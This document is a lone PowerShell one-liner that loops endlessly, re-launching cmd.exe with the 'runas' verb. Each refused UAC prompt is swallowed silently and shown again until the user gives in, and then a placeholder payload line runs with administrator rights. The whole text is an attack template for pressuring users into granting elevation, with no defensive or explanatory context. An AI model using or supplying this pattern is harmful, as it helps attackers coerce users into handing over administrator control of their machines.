while($true){try{Start-Process "cmd.exe" -Verb runas -ArgumentList "/c", 'echo Your payload && pause';exit}catch{}}
